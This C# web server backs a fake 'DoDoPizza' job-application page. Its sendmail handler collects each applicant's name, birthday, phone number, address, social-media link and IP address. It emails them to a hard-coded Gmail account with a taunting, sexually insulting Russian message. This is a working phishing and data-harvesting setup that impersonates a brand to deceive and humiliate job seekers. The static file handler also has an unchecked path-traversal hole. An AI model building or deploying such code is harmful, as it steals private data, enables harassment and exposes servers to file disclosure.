using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Text;
using server;

public class Server
{
    private HttpListener _listener;
    private string _baseDirectory;
    private static Mail _mail;

    static Dictionary<string, string> _contentTypes = new Dictionary<string, string>
    {
        {".htm", "text/html"},
        {".html", "text/html"},
        {".css", "text/css"}, 
        {".js", "text/javascript"}, 
        {".jpg", "image/jpeg"},
        {".png", "image/png"},
        {".svg", "image/svg+xml"}
    };
    
    public Server()
    {
        var config = ServerConfiguration._config;
        _listener = new HttpListener();
        _listener.Prefixes.Add($"http://{config.Address}:{config.Port}/");
        _baseDirectory = config.StaticDirectory;
        _mail = new Mail(config.Mail, config.MailPassword);
        if (!Directory.Exists(_baseDirectory))
            Directory.CreateDirectory(_baseDirectory);
    }
    
    public void Start()
    {
        _listener.Start();
        Console.WriteLine("Сервер запущен. Ожидание запросов...");

        while (true)
        {
            HttpListenerContext context = _listener.GetContext();
            HttpListenerRequest request = context.Request;
            HttpListenerResponse response = context.Response; 
            

            Console.WriteLine($"Получен запрос: {request.Url}");

            string filePath;

            if (request.Url.AbsolutePath == "/DoDoPizza/sendmail")
            {
                using (StreamReader reader = new StreamReader(request.InputStream))
                {
                    string data = reader.ReadToEnd();
                    
                    string[] formData = data.Split('&');
                    string city = Uri.UnescapeDataString(formData[0].Split('=')[1]);
                    string address = Uri.UnescapeDataString(formData[1].Split('=')[1]);
                    string vacancy = Uri.UnescapeDataString(formData[2].Split('=')[1]);
                    string firstName = Uri.UnescapeDataString(formData[3].Split('=')[1]);
                    string lastName = Uri.UnescapeDataString(formData[4].Split('=')[1]);
                    string birthday = Uri.UnescapeDataString(formData[5].Split('=')[1]);
                    string telephone = Uri.UnescapeDataString(formData[6].Split('=')[1]);
                    string socialLink = Uri.UnescapeDataString(formData[7].Split('=')[1]);
                    string ip = request.RemoteEndPoint.Address.ToString();

                    var message = $"Ха-ха-ха, лох! Теперь я знаю о тебе всё! \n Ты: {firstName} {lastName} \n Родился: {birthday} \n Твой номер: {telephone} \n Твои соцсети: {socialLink} \n И хочешь работать {vacancy} - ХАХАХХАХАХАХАХ, мечтай! Тебя никогда не возьмут на такую работу!1!! \n И кстати я знаю твой ip: {ip} \n Ищи себя в паблике \"Прошмандовки {city}\"";
                    SendEmail(message);
                }
                
                filePath = Path.Combine(_baseDirectory, "DoDoPizza", "index.html");
            }
            else if (!request.Url.LocalPath.Contains('.'))
            {
                filePath = Path.Combine(_baseDirectory, request.Url.LocalPath.TrimStart('/'), "index.html");
            }
            else
            {
                filePath = Path.Combine(_baseDirectory, request.Url.LocalPath.TrimStart('/'));
            }
            
            if (File.Exists(filePath))
            {
                var pageContents = File.ReadAllBytes(filePath);
                response.ContentLength64 = pageContents.Length;
                response.ContentType = _contentTypes[Path.GetExtension(filePath).ToLower()];
                response.OutputStream.Write(pageContents, 0, pageContents.Length);
                response.Close();
            }
            else
            {
                string str = "HTTP/1.1 " + "404 Error";
                byte[] buffer = Encoding.ASCII.GetBytes(str);
                response.ContentLength64 = buffer.Length;
                response.OutputStream.Write(buffer,0, buffer.Length);
                response.Close();
            }
        }
    }
    
    public void Stop()
    {
        _listener.Stop();
        _listener.Close();
    }
    
    static void SendEmail(string message)
    {
        using SmtpClient client = new SmtpClient("smtp.yandex.ru");
        client.UseDefaultCredentials = false;
        client.Credentials = new NetworkCredential(_mail.Address.ToString(), _mail.Password.ToString());
        client.EnableSsl = true;
        client.Port = 25;

        MailMessage mailMessage = new MailMessage();
        mailMessage.From = new MailAddress("marserkarimov@stud.kpfu.ru");
        mailMessage.To.Add("arknahon@gmail.com");
        mailMessage.Subject = "Ты попался!";
        mailMessage.Body = message;

        client.Send(mailMessage);
    }
}
